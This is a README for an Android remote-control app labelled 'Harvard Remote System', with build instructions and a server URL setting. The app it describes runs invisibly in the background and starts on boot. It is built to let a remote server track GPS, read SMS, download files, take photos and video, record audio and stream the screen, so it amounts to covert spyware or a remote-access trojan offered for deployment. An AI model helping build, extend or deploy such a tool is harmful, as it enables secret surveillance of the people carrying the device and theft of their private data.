# Harvard Remote System - Android APK

A comprehensive remote device management system for Harvard admission consisting of Android APK with advanced remote control capabilities.

## 🚀 Quick Start for Android Studio

### Prerequisites
- **Android Studio** (Latest version - Arctic Fox or newer)
- **Android SDK** with API Level 24+ (Android 7.0)
- **Java Development Kit (JDK)** 11 or higher
- **Physical Android device** (recommended) or emulator

### Opening in Android Studio

1. **Open Android Studio**
2. **Choose "Open an Existing Project"**
3. **Navigate to this APK folder** (`/workspaces/Remote-System-APK/APK/`)
4. **Click "Open"**
5. **Wait for Gradle sync** to complete (may take a few minutes)

### Building the APK

#### Option 1: Through Android Studio UI
1. **Build → Generate Signed Bundle/APK**
2. **Choose APK**
3. **Create new keystore** (for testing) or use existing
4. **Build variant**: Debug (for testing) or Release (for production)

#### Option 2: Using Gradle (Terminal in Android Studio)
```bash
# Debug APK (for testing)
./gradlew assembleDebug

# Release APK (for production)
./gradlew assembleRelease
```

**Generated APK Location:**
- Debug: `app/build/outputs/apk/debug/app-debug.apk`
- Release: `app/build/outputs/apk/release/app-release.apk`

## 📋 Key Features

### 🎯 Core Functionality
- **Silent Background Operation** - Runs invisibly with minimal UI
- **Auto-start Service** - Automatically starts on device boot
- **Real-time Status Display** - Color-coded connection indicators (🟢🟡🔴❌)
- **Enterprise-grade Error Handling** - Comprehensive try-catch blocks with timestamps
- **Bulletproof Retry Logic** - Exponential backoff (1s→30s max)

### 🔧 Remote Commands Supported
- **📱 Device Information** - Hardware specs, Android version, etc.
- **📍 GPS Location Tracking** - Real-time location data
- **📂 File Management** - Browse, download files
- **📧 SMS Access** - Read SMS messages
- **📷 Camera Control** - Photo capture, video streaming
- **🎤 Audio Recording** - Remote audio capture
- **📺 Screen Sharing** - Real-time screen capture
- **📱 App Management** - List and launch applications
- **📶 Network Information** - WiFi status and details

### 🔒 Security Features
- **Encrypted Communication** - WebSocket with secure protocols
- **Device Registration** - Secure device authentication
- **Permission Management** - Runtime permission handling
- **Error Logging** - Comprehensive audit trail

## 🛠️ Development Setup

### Server Configuration
The app connects to a server relay system. Update the server URL in:
```kotlin
// File: app/src/main/java/com/remote/system/RemoteControlService.kt
// Line ~42
private const val SERVER_URL = "http://10.0.2.2:3000/" // For emulator
// For real device: "http://YOUR_LOCAL_IP:3000/"
// For production: "https://your-server.com/"
```

### Required Permissions
The app requests these permissions at runtime:
- 📍 **Location** (GPS tracking)
- 📷 **Camera** (Photo/video capture)
- 🎤 **Microphone** (Audio recording)
- 📧 **SMS** (Message access)
- 📂 **Storage** (File operations)
- 📱 **Phone** (Device information)

## 🏗️ Project Structure

```
APK/
├── app/
│   ├── src/main/
│   │   ├── java/com/remote/system/
│   │   │   ├── MainActivity.kt           # Main UI (minimal interface)
│   │   │   ├── RemoteControlService.kt   # Core background service
│   │   │   ├── *Command.kt              # Command handlers (9 classes)
│   │   │   └── BootReceiver.kt          # Auto-start on boot
│   │   ├── res/
│   │   │   ├── layout/
│   │   │   │   └── activity_main.xml    # Minimal UI layout
│   │   │   └── values/
│   │   │       ├── strings.xml          # Professional text resources
│   │   │       └── themes.xml           # App theme
│   │   └── AndroidManifest.xml          # Permissions & components
│   └── build.gradle.kts                 # Dependencies
├── build.gradle.kts                     # Project configuration
└── settings.gradle.kts                  # Gradle settings
```

## 🧪 Testing

### Testing on Emulator
1. **Create AVD** with API 24+ (Android 7.0+)
2. **Enable all permissions** manually in Settings
3. **Use localhost server**: `http://10.0.2.2:3000/`

### Testing on Real Device
1. **Enable Developer Options** & **USB Debugging**
2. **Install APK** via Android Studio or manually
3. **Grant all permissions** when prompted
4. **Update server URL** to your computer's IP address

## 🚨 Important Notes

### For Production Use
- [ ] **Change server URL** to production server
- [ ] **Generate signed APK** with proper keystore
- [ ] **Test all permissions** on target devices
- [ ] **Verify network connectivity** requirements

### Security Considerations
- App operates with **minimal user interface** by design
- All communication is **logged** for debugging
- **Requires explicit permission grants** for all sensitive operations
- **No unauthorized data collection** - only responds to server commands

## 📞 Support

### Common Issues
1. **App not connecting**: Check server URL and network connectivity
2. **Permissions denied**: Manually grant permissions in Android Settings
3. **Build errors**: Ensure Android Studio and SDK are up to date

### Contact
For technical support regarding Harvard Remote System integration, contact the development team.

---

**⚠️ IMPORTANT**: This app is designed for Harvard admission remote device management. Ensure compliance with all applicable privacy laws and regulations before deployment.
